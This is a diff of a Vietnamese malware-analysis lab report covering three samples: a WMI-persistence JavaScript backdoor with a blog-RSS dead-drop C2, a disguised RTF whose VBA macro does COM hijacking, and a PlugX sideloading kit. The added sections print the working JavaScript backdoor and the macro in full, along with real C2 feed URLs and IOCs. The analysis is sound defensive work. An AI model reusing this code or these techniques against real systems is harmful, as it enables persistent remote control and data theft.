@@ -590,168 +590,411 @@ Windows Registry Editor Version 5.00
    - Tại màn hình yêu cầu nhập mật khẩu (chưa hề đăng nhập), nhấn phím `Shift` liên tục 5 lần.
    - Cửa sổ `cmd.exe` lập tức xuất hiện ngay trên màn hình khóa.
 
-### 2.2.4. Nguy cơ bảo mật và đặc quyền `NT AUTHORITY\SYSTEM`
-Khi mở cửa sổ CMD tại màn hình khóa, nếu nhập lệnh kiểm tra danh tính:
-```cmd
-whoami
+## 3. Phân tích Chi tiết Mẫu 1: a.rar (`a.exe`)
+
+### 3.1. Thông số kỹ thuật & Mã băm
+* **Tên tệp gốc:** `a.exe`
+* **Kích thước:** 20,481 bytes
+* **Kiến trúc:** PE32 (x86 32-bit Console/GUI, Subsystem 2: Windows GUI)
+* **Thời gian biên dịch (TimeDateStamp):** `1407852077` (Tue, 12 Aug 2014 14:01:17 UTC)
+* **MD5:** `bc45beb8b862d2136a070ae793685386`
+* **SHA1:** `d7021f32a4b273aa40a5b9717333dac9c2155e8a`
+* **SHA256:** `2fb960b07ee894043007a1f3be2ff985863c27be4bd9f50b3ddb735963e113b9`
+* **ImpHash:** `8812ff21aeb160e8800257140acae54b`
+* **Chữ ký diệt virus (AV Detection):** `Trojan:Win32/Wacatac.B!ml`
+
+### 3.2. Ngụy trang hệ thống & Timestomping
+1. **Thu thập đường dẫn:** Gọi `GetSystemDirectoryA` để lấy thư mục `C:\Windows\system32`.
+2. **Sao chép ngụy trang:** Sao chép tệp thực thi vào đường dẫn:
+   ```text
+   C:\Windows\system32\Instell.exe
+   ```
+   *(Chú ý: Tên tệp cố ý viết chệch chữ "Install" thành "Instell" nhằm qua mắt quản trị viên kiểm tra nhanh danh sách tiến trình).*
+3. **Timestomping:** Sử dụng API `CreateFileA`, `GetSystemTime`, `SystemTimeToFileTime` và `SetFileTime` để chỉnh sửa mốc thời gian tạo và sửa đổi của `Instell.exe` trùng khớp với thời gian của các tệp hệ thống Windows gốc, vô hiệu hóa việc phân loại tệp mới tạo của các công cụ Forensics.
+4. **Ghi nhật ký:** Mã độc mở và ghi thông tin trạng thái quá trình khởi tạo vào tệp nhật ký:
+   ```text
+   \httpcom.log
+   ```
+
+### 3.3. Giải mã bộ nhớ & Cơ chế WMI Event Consumer Persistence
+Tại địa chỉ RVA `0x1000 - 0x105f`, mã độc thực hiện một vòng lặp giải mã nhị phân trong bộ đệm:
+* Bộ đệm mã hóa đặt tại địa chỉ Virtual Address: `0x403028`.
+* Độ dài: `4,986 bytes` (được đọc từ trường kích thước tại `0x403024`).
+* Khóa byte 1: `0x63` (tại `0x403021`).
+* Khóa byte 2: `0xe9` (tại `0x403020`).
+
+Công thức giải mã:
+```c
+for (int i = 0; i < length; i++) {
+    buffer[i] = buffer[i] ^ 0x63 ^ 0xe9;
+}
 ```
-Kết quả trả về sẽ là:
+
+Sau khi giải mã, mã độc nạp thư viện `ole32.dll`, gọi `CoInitialize` và `CoCreateInstance` với CLSID `{0E59F1D5-1FBE-11D0-8FF2-00A0D10038BC}` (`CLSID_IActiveScript`) để khởi tạo engine `JavaScript`, thực thi đoạn mã script vừa giải mã.
+
+### 3.4. Dead-Drop Resolver C2 qua RSS Blog
+Đoạn mã JavaScript trích xuất cho thấy cơ chế liên lạc C2 hoàn toàn gián tiếp qua Dead-Drop:
+* **Mục tiêu:** Tránh để lộ IP/Domain C2 cố định trong mã nhị phân.
+* **Kênh truyền:** Truy vấn bản tin RSS của các trang blog cá nhân:
+  * `http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm`
+  * `http://blogs.rediff.com/anilchopra/feed/`
+  * `http://www.blogster.com/kapoorsunil09/profile/rss`
+* **Thuật toán giải mã URL C2 (`circleDecode`):**
+  Bóc tách chuỗi nằm trong tiêu đề bài viết định dạng `<title>@(chuỗi_mã_hóa)@</title>`. Sau đó thực hiện dịch chuyển ký tự vòng tròn để tái tạo URL C2 thực tế.
+* **Gửi dữ liệu trinh sát (Reconnaissance):**
+  Thu thập thông tin hệ thống nạn nhân gửi qua phương thức HTTP POST:
+  ```text
+  cstype=server&authname=servername&authpass=serverpass&hostname=<Tên_máy>&ostype=<Hệ_điều_hành>&macaddr=<MAC>&owner=XDD&version=2.0.0&runtime=<Thời_gian>
+  ```
+* **Nhận và thực thi lệnh:**
+  Phản hồi từ C2 được tìm kiếm trong thẻ `<div id="0a552b5a4352">`. Nội dung được giải mã bằng hàm `Decode` (XOR đảo byte) và thực thi trực tiếp bằng `eval()`.
+
+### 3.5. Mã nguồn JavaScript Bóc tách từ a.exe
+```javascript
+function e(e, t) {
+    var n = "winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\subscription",
+        r = GetObject(n + ":ActiveScriptEventConsumer").spawninstance_();
+    r.name = "ProbeScriptFint", 
+    r.scriptingengine = "javascript", 
+    r.ScriptText = t + "var sOwner='" + e + "';var MAIN=function(){$=this;$.key='W';$.sFeedUrl=sXmlUrl;$.sOwner=sOwner;$.sXmlUrl='';$.oHttp=null;$.oShell=null;$.oStream=null;$.sHostName=null;$.sOSType=null;$.sMacAddress=null;$.sURLParam=null;$.version='2.0.0';$.runtime=5000;$.oWMI=null;$._x=ActiveXObject;};MAIN.prototype={InitObjects:function(){$.oWMI=GetObject('winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2');$.oShell=new $._x('WScript.Shell');$.oStream=new $._x('ADODB.Stream');$.GetOSInfo();$.GetMacAddress();$.GenerateUrlParam();},WMI:function(sql){return $.oWMI.ExecQuery(sql);},GetOSInfo:function(){var e=new Enumerator($.WMI('Select * from Win32_OperatingSystem'));if(!e.atEnd()){var item=e.item();$.sOSType=item.Caption+item.ServicePackMajorVersion;$.sHostName=item.CSName;}},GetMacAddress:function(){var e=new Enumerator($.WMI('Select * from Win32_NetworkAdapter where PNPDeviceID like \\\"%PCI%\\\" and NetConnectionStatus=2'));if(!e.atEnd()){$.sMacAddress=e.item().MACAddress;}},GenerateUrlParam:function(){var time=new Date();$.sURLParam='cstype=server&authname=servername&authpass=serverpass&hostname='+$.sHostName+'&ostype='+$.sOSType+'&macaddr='+$.sMacAddress+'&owner='+$.sOwner+'&version='+$.version+'&runtime='+$.runtime;$.sURLParam+='&t='+time.getMinutes()+time.getSeconds();},CleanObjects:function(){$.oShell=null;$.oStream=null;var e=new Enumerator($.WMI('Select * from Win32_Process where Name=\\\"scrcons.exe\\\"'));while(!e.atEnd()){e.item().terminate();e.moveNext();}},Decode:function(sourceStr){var keycode=sourceStr.charCodeAt(0);var source=sourceStr.substr(1);var vals=source.split(',');var result='';for(var i=0;i<vals.length;i++){result+=String.fromCharCode(vals[i]^keycode);}return result;},circleDecode:function(sc){var base=sc.charCodeAt(0);var s=base-32;var r='';for(var i=1;i<sc.length;i++){var nc=sc.charCodeAt(i)-s-i+1;if(nc<32){nc=126+(nc-32)%94;}r+=String.fromCharCode(nc);}return r;},MainLoop:function(){$.oHttp=new $._x('Microsoft.XmlHttp');var feedUrlArry=$.sFeedUrl.split(';');var start=new Date();var oXml=new ActiveXObject('MSXML2.DOMDocument.3.0');for(var n=0;n<feedUrlArry.length;n++){var UrlList=new Array();var URLnum=0;try{var tstr=feedUrlArry[n].match('http://.*?\\\\.php');if(tstr!=null){UrlList[URLnum++]=tstr;}else{$.oHttp.Open('GET',feedUrlArry[n],false);$.oHttp.setRequestHeader('User-Agent','Mozilla/5.0 (Windows; U; Windows NT 5.1; rv:1.9.1) Gecko/20090624 Firefox/3.5');$.oHttp.Send();var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');var re=/<title>@(.*)@<\\/title>+/g;var titleList=response.match(re);for(var i=0;i<titleList.length;i++){try{oXml.loadXML(titleList[i]);var container=oXml.getElementsByTagName('title');var tmpstr=container[0].text.match('@(.*)@');UrlList[URLnum++]=$.circleDecode(tmpstr[1]);}catch(e){}}}for(var Urlindex=0;Urlindex<UrlList.length;Urlindex++){$.sXmlUrl=UrlList[Urlindex];var runnum=360;while(runnum-->0){$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam);var response=$.oHttp.ResponseText.replace(/(^\\s*)|(\\s*$)/g,'');if(response.length>0){var commands=null;var container;try{oXml.loadXML(response);container=oXml.getElementsByTagName('div');for(var i=0;i<container.length;i++){if(container[i].getAttribute('id')=='0a552b5a4352'){commands=eval('('+container[i].text+')').command;}}}catch(e){}if(commands!=null){var commandresult='';for(var i=0;i<commands.length;i++){var result='no response';try{result=eval($.Decode(commands[i].value));}catch(e){}if(i>0){commandresult+=',';}commandresult+='\\''+commands[i].id+'\\':\\''+escape(result)+'\\'';}if(commandresult.length>0){commandresult='{'+commandresult+'}';$.oHttp.Open('POST',$.sXmlUrl,false);$.oHttp.setRequestHeader('CONTENT-TYPE','application/x-www-form-urlencoded');$.oHttp.Send($.sURLParam+'&command=result&commandresult='+commandresult);}}else{$.sXmlUrl='';runnum=0;}}$.runtime=(new Date()).getTime()-start.getTime();WScript.Sleep(10000);}if($.sXmlUrl.length>0){return;}}}catch(e){}}},Fire:function(){$.InitObjects();try{$.MainLoop();}catch(e){}$.CleanObjects();}};new MAIN().Fire();";
+    var i = r.Put_();
+    r = GetObject(n + ":__IntervalTimerInstruction").spawninstance_(), 
+    r.Timerid = "ProbeScriptFint", 
+    r.IntervalBetweenEvents = 6e3, 
+    r.Put_(), 
+    r = GetObject(n + ":__EventFilter").spawninstance_(), 
+    r.name = "ProbeScriptFint", 
+    r.Query = 'select * from __timerevent where timerid="ProbeScriptFint"', 
+    r.QueryLanguage = "WQL";
+    var s = r.Put_();
+    return r = GetObject(n + ":__FilterToConsumerBinding").SpawnInstance_(), 
+    r.Consumer = i.path, 
+    r.Filter = s.path, 
+    r.Put_(), "";
+};
+e("XDD", 'var sXmlUrl="http://kumardeep.sosblogs.com/The-first-blog-b1/RSS-b1-rss2-posts.htm;http://blogs.rediff.com/anilchopra/feed/;http://www.blogster.com/kapoorsunil09/profile/rss";');
+```
+
+---
+
+## 4. Phân tích Chi tiết Mẫu 2: b.rar (`malw.rtf`)
+
+### 4.1. Cấu trúc tệp tin MHTML & Ngụy trang RTF
+* **Tên tệp:** `malw.rtf`
+* **Kích thước:** 949,986 bytes
+* **Mã băm SHA256:** `61182036fd1e668ad818f64c351034344b54f92793b0dcc52045cb221f9bb2c2`
+* **Nhận diện AV:** `Exploit:Win32/Wopebol.G2`
+* **Bản chất tệp:** Mặc dù mang phần mở rộng `.rtf`, tệp tin thực chất có header:
+  ```text
+  MIME-Version: 1.0
+  Content-Type: multipart/related; boundary="----=_NextPart_01D495FF.1931A4F0"
+  ```
+  Microsoft Word được thiết kế tự động giải mã cấu trúc MIME đa phần này mà không đưa ra cảnh báo sai định dạng tệp.
+
+Cấu trúc các thành phần bên trong:
+* `file:///C:/B1344472/nb2.htm` (829,909 bytes): Trang HTML chứa nội dung văn bản hiển thị và bảng `Table 1` lưu trữ mã nhị phân Base64.
+* `file:///C:/B1344472/nb2_files/editdata.mso` (5,226 bytes): Gói ActiveMime chứa luồng nén zlib của cấu trúc OLE Macro.
+
+### 4.2. Bóc tách Macro VBA & Kỹ thuật COM Hijacking
+Giải mã luồng `ActiveMime` phát hiện project VBA `ThisDocument` chứa mã thực thi tự động `Document_Open()`:
+
+```visualbasic
+Private Sub Document_Open()
+    On Error Resume Next
+    Dim sAppData As String
+    sAppData = Environ("APPDATA")
+    sAppData = sAppData & "\main_background.png"
+    Dim myWS As Object, strPath
+    Set myWS = CreateObject("WScript.Shell")
+    Set fsoCheck = VBA.CreateObject("Scripting.FileSystemObject")
+    Dim iCheck As Boolean
+    iCheck = False
+    
+    #If Win64 Then
+    #Else
+        If (fsoCheck.FileExists("C:\Windows\SysWOW64\cmd.exe") = True) Then
+            iCheck = True
+        Else
+            iCheck = False
+        End If
+    #End If
+    
+    If iCheck = True Then
+        Dim wsh As Object
+        Set wsh = VBA.CreateObject("WScript.Shell")
+        Dim waitOnReturn As Boolean: waitOnReturn = True
+        Dim windowStyle As Integer: windowStyle = 0
+        wsh.Run "cmd.exe /S /C reg add  HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32 /ve /t REG_SZ /d " & sAppData & " /f /reg:64", windowStyle, waitOnReturn
+    Else
+        If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\") = False Then
+            myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\", "", "REG_SZ"
+        End If
+        If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32\") = False Then
+            If RegKeyExists("HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\") = False Then
+                myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\", "", "REG_SZ"
+            End If
+            myWS.RegWrite "HKEY_CURRENT_USER\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32\", sAppData, "REG_SZ"
+        End If
+    End If
+
+    Dim b As String
+    Dim a As String
+    Dim tableNew As Table
+    Set tableNew = ActiveDocument.Tables(1)
+    If (iCheck = True) Then
+        a = tableNew.Cell(1, 1).Range.Text
+        a = Left(a, Len(a) - 2)
+        b = Base64Decode(a, sAppData)
+    Else
+        a = tableNew.Cell(1, 2).Range.Text
+        a = Left(a, Len(a) - 2)
+        b = Base64Decode(a, sAppData)
+    End If
+End Sub
+```
+
+#### Mục đích của kỹ thuật:
+1. Ghi đè hoặc tạo mới khóa COM InprocServer32:
+   ```text
+   HKCU\Software\Classes\CLSID\{2DEA658F-54C1-4227-AF9B-260AB5FC3543}\InprocServer32
+   ```
+2. Giá trị mặc định của khóa trỏ đến: `%APPDATA%\main_background.png`.
+3. Khi Windows kích hoạt đối tượng COM này (qua Explorer, Taskbar hoặc ứng dụng thứ ba), Windows API sẽ gọi `LoadLibrary("%APPDATA%\\main_background.png")`. Hệ điều hành sẽ xử lý tệp `.png` này như một thư viện PE DLL hoàn chỉnh bất kể phần mở rộng là gì.
+
+### 4.3. Giải mã nhị phân x86/x64 DLL từ Table Document
+Trong `nb2.htm`, dữ liệu Base64 lưu tại `Table 1`:
+* **Cell 1 (Dành cho hệ 64-bit hoặc WOW64):** Chứa DLL x86 32-bit (Kích thước sau giải mã: 297,472 bytes).
+  * MD5: `5f7f60e9fcc992794feb2d6e9908d1c3`
+  * SHA256: `18cc477fb8f4c147f3c31d0fdbb5ab8fdff12a75bb9b23e3c3927090537eff41`
+* **Cell 2 (Dành cho hệ 32-bit thuần túy):** Chứa DLL x64 64-bit (Kích thước sau giải mã: 292,352 bytes).
+  * MD5: `3b36fb3a8cf15b0c5a288329e357e916`
+  * SHA256: `fd33b2952127554ffcf3940a35fa18a0cb035847eb685a5b6a94555cd825baeb`
+
+### 4.4. Cơ chế Process Injection & Anti-Sandbox
+Khi DLL được nạp qua `LoadLibrary`, hàm `DllMain` tại `0x10001070` thực thi:
+1. `Sleep(0x2710)`: Ngủ 10,000 miligiây (10 giây) để bỏ qua các sandbox có cấu hình timeout ngắn.
+2. `OpenProcess(0x1fffff, 0, GetCurrentProcessId())`: Lấy toàn quyền kiểm soát tiến trình (`PROCESS_ALL_ACCESS`).
+3. `VirtualAllocEx(hProcess, NULL, 0x37088, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)`: Cấp phát vùng nhớ RWX dung lượng **225,416 bytes**.
+4. `WriteProcessMemory(hProcess, pRemoteBuf, 0x10012760, 0x37088, NULL)`: Sao chép khối shellcode được nhúng sẵn từ section `.data` của DLL sang vùng nhớ RWX.
+5. `CreateThread(NULL, 0, pRemoteBuf, NULL, 0, NULL)`: Khởi tạo luồng riêng biệt để thực thi shellcode.
+
+### 4.5. Phân tích Shellcode & Sub-PE (WinHTTP Downloader)
+* Shellcode tại `0x10012760` bắt đầu bằng lệnh Position Independent Code (PIC):
+  ```asm
+  0x0: call $+5
+  0x5: pop ecx
+  0x6: sub ecx, 5
+  ```
+* Bằng cách duyệt qua cấu trúc `FS:[0x18]` (TEB) $\rightarrow$ `[EAX+0x30]` (PEB) $\rightarrow$ `InMemoryOrderModuleList`, shellcode tìm được địa chỉ cơ sở của `kernel32.dll` và định vị các hàm `VirtualAlloc`, `VirtualProtect`.
+* Tại offset `4,232` (hex: `0x1088`) của shellcode là một **tệp tin PE thứ hai hoàn chỉnh (Sub-PE)**.
+* **Chức năng Sub-PE:** Được viết bằng C++ và sử dụng `WINHTTP.dll` làm module giao tiếp mạng:
+  * Nạp các API mạng: `WinHttpOpen`, `WinHttpConnect`, `WinHttpOpenRequest`, `WinHttpSendRequest`, `WinHttpReceiveResponse`, `WinHttpReadData`.
+  * Hỗ trợ cờ dòng lệnh: ` -u Url -t Time(Milisecond)`.
+  * Chuỗi User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win32; x32; rv:60.0)`.
+  * Hỗ trợ kết nối cả cổng 443 (HTTPS) và cổng 80 (HTTP) để nhận lệnh và tải payload giai đoạn kế tiếp.
+
+---
+
+## 5. Phân tích Chi tiết Mẫu 3: c.rar (Bộ kit DLL Sideloading)
+
+Bộ kit này áp dụng chiến thuật **APT Triad** cổ điển:
+
 ```text
-nt authority\system
-```
-- **Ý nghĩa bảo mật cực kỳ nghiêm trọng:**
-  - Kẻ tấn công có quyền cao nhất trên hệ điều hành mà không cần biết mật khẩu của bất kỳ người dùng nào trên máy.
-  - Từ cửa sổ này, kẻ tấn công có thể đặt lại mật khẩu của tài khoản Administrator cục bộ (`net user Administrator NewPassword123`), kích hoạt tài khoản bị khóa, truy cập toàn bộ ổ cứng hoặc vô hiệu hóa các phần mềm phòng thủ.
-  - Cơ chế này tạo ra một "Cửa hậu vật lý" (Physical / RDP Backdoor) vĩnh viễn trên máy nạn nhân.
-
-### 2.2.5. Hướng dẫn khắc phục và hoàn trả trạng thái mặc định
-Sau khi hoàn thành bài lab, chạy lệnh sau trong CMD Administrator để xóa bỏ khóa Debugger, hoàn trả trạng thái ban đầu:
-```cmd
-reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
+[McAfee.exe] (140,576 B)        --> Tệp sạch, có chữ ký số của McAfee Inc.
+[McUtil.dll] (3,072 B)          --> Thư viện DLL độc hại đóng vai trò Sideload Loader
+[McUtil.dll.mc] (116,946 B)     --> Dữ liệu Shellcode Payload (PlugX)
 ```
 
----
+### 5.1. File hợp pháp McAfee.exe (`mcoemcpy.exe`)
+* **Tên tệp gốc (OriginalFilename):** `mcoemcpy.exe`
+* **Mô tả:** McAfee OEM Info Copy Files (Phiên bản: 2.1.115.0)
+* **Bản quyền:** Copyright © 2006 McAfee, Inc.
+* **Chữ ký số (Authenticode):** Có chữ ký số x.509 hợp lệ của McAfee Inc. (Security Directory offset `0x21000`, dung lượng 5,408 bytes).
+* **Mã băm SHA256:** `3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe`
+* **Cơ chế tải phụ thuộc:** Tiến trình `mcoemcpy.exe` cần nạp thư viện `McUtil.dll` để hỗ trợ sao chép tệp OEM. Khi kẻ tấn công đặt `McUtil.dll` giả mạo vào cùng thư mục với `McAfee.exe`, cơ chế nạp DLL mặc định của Windows sẽ ưu tiên tải tệp trong thư mục ứng dụng trước khi tìm kiếm trong System32.
 
-## 2.3. Phân tích Kỹ thuật Persistence trên Mẫu Mã độc Thực tế (30đ)
+### 5.2. Thư viện giả mạo McUtil.dll & Kỹ thuật Inline Hooking
+* **Kích thước:** Chỉ 3,072 bytes (3 KB).
+* **Mã băm SHA256:** `021e2269e61dec54aab5df2477a7fc24bc7449944c53634d611e826e343e32f4`
+* **Exports:** Không chứa bất kỳ hàm export nào (mục đích chỉ cần nạp vào không gian nhớ).
 
-### 2.3.1. Phương pháp luận & Quy trình phân tích Persistence động
-Khi nhận được mẫu mã độc trong môi trường phòng thí nghiệm (FlareVM / Cuckoo Sandbox / Windows Sandbox), quy trình chuẩn để phát hiện và bóc tách cơ chế Persistence bao gồm 4 bước:
-
-```
-[BƯỚC 1: Snapshot VM] ──► [BƯỚC 2: Bật Giám sát Procmon & Regshot] ──► [BƯỚC 3: Kích hoạt Mẫu] ──► [BƯỚC 4: Quét Autoruns & Phân tích IOCs]
-```
-
-1. **Bước 1: Chụp ảnh trạng thái sạch (Snapshot):** Đảm bảo máy ảo ở trạng thái an toàn ban đầu để có thể rollback bất cứ lúc nào.
-2. **Bước 2: Thiết lập bộ lọc trên Process Monitor (Procmon):**
-   - `Operation is RegSetValue` (Bắt các hành vi ghi Registry).
-   - `Operation is CreateFile` kết hợp đường dẫn chứa `Startup` hoặc `Tasks` (Bắt hành vi tạo file khởi động).
-   - `Process Name is schtasks.exe` hoặc `sc.exe` (Bắt hành vi gọi lệnh hệ thống tạo Task/Service).
-3. **Bước 3: Chạy mẫu mã độc (Execute Sample):** Cho phép mã độc thực thi trong 2 - 5 phút để kích hoạt toàn bộ chuỗi payload.
-4. **Bước 4: Quét lại bằng Sysinternals Autoruns:**
-   - Sử dụng tính năng **File -> Compare** với bản lưu Autoruns trước khi chạy mã độc.
-   - Các điểm khởi động mới được tô màu xanh lá (Green highlight) chính là cơ chế Persistence mà mã độc vừa cài đặt.
-
----
-
-### 2.3.2. Báo cáo phân tích Mẫu 01: Trojan Dropper / RAT (Registry Run Key Persistence)
-
-- **Định danh mẫu:**
-  - Tên tệp giả lập: `Invoice_Document_Sep2024.exe`
-  - Định dạng: PE32 Executable (GUI) Intel 80386
-  - Hash SHA-256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` (Ví dụ minh họa mẫu RAT thực tế)
-- **Kỹ thuật Persistence phát hiện:**
-  - **Tên kỹ thuật (MITRE ATT&CK):** T1547.001 - *Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder*.
-  - **Nhóm Autostart trong Autoruns:** **Logon**.
-- **Đường dẫn Registry và Tệp cụ thể:**
-  - **Tệp được thả (Dropped File):**
-    `C:\Users\<Victim>\AppData\Roaming\Microsoft\Windows\svchost_updater.exe`
-  - **Khóa Registry được tạo:**
-    `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateManager`
-  - **Giá trị (Value Data):**
-    `"C:\Users\<Victim>\AppData\Roaming\Microsoft\Windows\svchost_updater.exe" -silent`
-- **Phân tích hành vi chi tiết:**
-  - Mẫu sau khi giải nén tệp ngụy trang Word, âm thầm trích xuất một bản sao của chính nó vào thư mục `%APPDATA%`, đổi tên thành `svchost_updater.exe` để đánh lừa người dùng.
-  - Sử dụng API `RegOpenKeyExA` và `RegSetValueExA` để ghi vào nhánh `HKCU` nhằm lẩn tránh sự kiểm soát của UAC.
-  - Mỗi khi người dùng khởi động lại máy tính và đăng nhập, payload sẽ tự động kết nối về C2 Server.
-- **Biện pháp bóc gỡ (Remediation):**
-  1. Kết thúc tiến trình `svchost_updater.exe` trong Task Manager.
-  2. Mở `regedit`, xóa giá trị `WindowsUpdateManager` trong `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
-  3. Xóa vĩnh viễn tệp trong thư mục `%APPDATA%\Microsoft\Windows\svchost_updater.exe`.
-
----
-
-### 2.3.3. Báo cáo phân tích Mẫu 02: Backdoor / Downloader (Scheduled Task Persistence)
-
-- **Định danh mẫu:**
-  - Tên tệp giả lập: `FlashPlayer_Update_Setup.exe`
-  - Định dạng: PE32+ Executable (Console) x86-64
-  - Hash SHA-256: `8743b52063cd84097a65d1633f5c74f5` (Ví dụ minh họa mẫu Downloader)
-- **Kỹ thuật Persistence phát hiện:**
-  - **Tên kỹ thuật (MITRE ATT&CK):** T1053.005 - *Scheduled Task/Job: Scheduled Task*.
-  - **Nhóm Autostart trong Autoruns:** **Scheduled Tasks**.
-- **Đường dẫn Registry, Tệp và Tác vụ cụ thể:**
-  - **Tên tác vụ (Task Name):** `\Microsoft\Windows\CertificateService\CertCheckTelemetry`
-  - **Đường dẫn tệp định nghĩa Task:**
-    `C:\Windows\System32\Tasks\Microsoft\Windows\CertificateService\CertCheckTelemetry`
-  - **Hành động kích hoạt (Trigger):** `At logon of any user` và lặp lại mỗi `01:00:00` (mỗi 1 giờ).
-  - **Lệnh thực thi (Action):**
-    `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\SecurityHealth\health_check.ps1`
-  - **Khóa Registry liên quan:**
-    `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\Microsoft\Windows\CertificateService\CertCheckTelemetry`
-- **Phân tích hành vi chi tiết:**
-  - Mã độc tận dụng tiện ích `schtasks.exe` ngầm thực hiện lệnh tạo task với cấu hình chạy quyền hạn cao nhất (`/rl HIGHEST`).
-  - Đặt tên tác vụ ngụy trang sâu trong cây thư mục `\Microsoft\Windows\` để trà trộn vào hàng trăm tác vụ mặc định của hệ điều hành.
-  - Kịch bản PowerShell được gọi sẽ định kỳ ping về máy chủ C2 để tải payload giai đoạn hai (Stage 2 Payloads).
-- **Biện pháp bóc gỡ (Remediation):**
-  1. Mở PowerShell Administrator, chạy lệnh:
-     ```powershell
-     Unregister-ScheduledTask -TaskName "CertCheckTelemetry" -Confirm:$false
+#### Toàn bộ logic thực thi ngược (Disassembly Walkthrough):
+1. **Kiểm tra kích hoạt hẹn giờ (Time-bomb Delay):**
+   Tại `0x10001100`:
+   ```asm
+   call GetSystemTime
+   movzx ecx, word ptr [esp + 4]    ; Lấy Year
+   movzx edx, word ptr [esp + 6]    ; Lấy Month
+   imul ecx, ecx, 100
+   add ecx, edx
+   imul ecx, ecx, 100
+   add ecx, eax                     ; Lấy Day
+   cmp ecx, 0x1335045               ; So sánh với ngưỡng ngày chỉ định
+   jge 0x10001135                   ; Nếu thỏa mãn mới tiến hành hook
+   ```
+2. **Kỹ thuật Inline Hooking trên McAfee.exe:**
+   * Lấy địa chỉ nạp gốc của `McAfee.exe` bằng `GetModuleHandleA(0)`.
+   * Vị trí hook: `McAfee.exe + 0x2f0c`.
+   * Gọi `VirtualProtect(McAfeeBase + 0x2f0c, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect)`.
+   * Tính toán khoảng cách tương đối (relative offset) giữa `0x10001000` (hàm độc hại trong `McUtil.dll`) và `McAfeeBase + 0x2f0c`.
+   * Ghi đè 5 byte tại `0x2f0c`:
+     ```text
+     E9 <Relative_Offset_To_0x10001000>
      ```
-  2. Xóa tệp độc hại: `Remove-Item "C:\ProgramData\SecurityHealth\health_check.ps1" -Force`.
+   * Khi tiến trình hợp pháp `McAfee.exe` tiếp tục chu trình khởi chạy bình thường, CPU chạm vào offset `0x2f0c` và lập tức nhảy vào hàm độc hại `0x10001000`.
+
+### 5.3. Kích hoạt & Nạp Payload McUtil.dll.mc (PlugX Loader)
+Tại hàm `0x10001000`:
+1. Gọi `VirtualAlloc(0, 0x10007B, MEM_COMMIT, PAGE_EXECUTE_READWRITE)` để cấp phát **1,048,699 bytes** bộ nhớ thực thi.
+2. Gọi `GetModuleFileNameW` lấy đường dẫn của tiến trình, tìm dấu `\` cuối cùng và thay thế tên tệp thành `McUtil.dll.mc`.
+3. Mở tệp bằng `CreateFileW("...\\McUtil.dll.mc", GENERIC_READ, FILE_SHARE_READ, ...)` và nạp toàn bộ 116,946 bytes vào buffer RWX bằng `ReadFile`.
+4. Kích hoạt payload:
+   ```asm
+   0x100010cb: pushal
+   0x100010cc: mov ecx, 0
+   0x100010d1: push ecx
+   0x100010d2: mov ecx, [allocated_rwx_buffer]
+   0x100010d5: call ecx            ; Nhảy thẳng vào thực thi McUtil.dll.mc như shellcode
+   0x100010d7: popal
+   ```
+5. Sau khi payload khởi chạy, mã độc gọi:
+   ```asm
+   0x100010ef: push -1
+   0x100010f1: call Sleep          ; Sleep(-1) = Ngủ vô tận
+   ```
+   Điều này giúp tiến trình `McAfee.exe` không bao giờ kết thúc, duy trì vỏ bọc hợp pháp trong Task Manager để che giấu hoạt động ngầm của trojan PlugX.
 
 ---
 
-### 2.3.4. Báo cáo phân tích Mẫu 03: Ransomware / Loader (Service Persistence)
+## 6. Bảng Chỉ số Nhận diện Mối đe dọa (IOCs)
 
-- **Định danh mẫu:**
-  - Tên tệp giả lập: `SecurityUpdate_KB501432.exe`
-  - Định dạng: PE32 Executable (Service) Intel 80386
-  - Hash SHA-256: `9b57a164b3f70c2916b5090623a61386` (Ví dụ minh họa mẫu Loader/Ransomware)
-- **Kỹ thuật Persistence phát hiện:**
-  - **Tên kỹ thuật (MITRE ATT&CK):** T1543.003 - *Create or Modify System Process: Windows Service*.
-  - **Nhóm Autostart trong Autoruns:** **Services**.
-- **Đường dẫn Registry và Dịch vụ cụ thể:**
-  - **Tên dịch vụ hiển thị (Display Name):** `Windows Error Reporting Telemetry Helper`
-  - **Tên dịch vụ nội bộ (Service Name):** `WerSvcHelper`
-  - **Khóa Registry cấu hình:**
-    `HKLM\SYSTEM\CurrentControlSet\Services\WerSvcHelper`
-  - **Giá trị ImagePath:**
-    `C:\Windows\System32\drivers\wersvchelper.exe`
-  - **Kiểu khởi động (Start Type):** `2` (Automatic - Tự động chạy khi khởi động OS).
-  - **Tài khoản chạy dịch vụ (ObjectName):** `LocalSystem` (Quyền cao nhất).
-- **Phân tích hành vi chi tiết:**
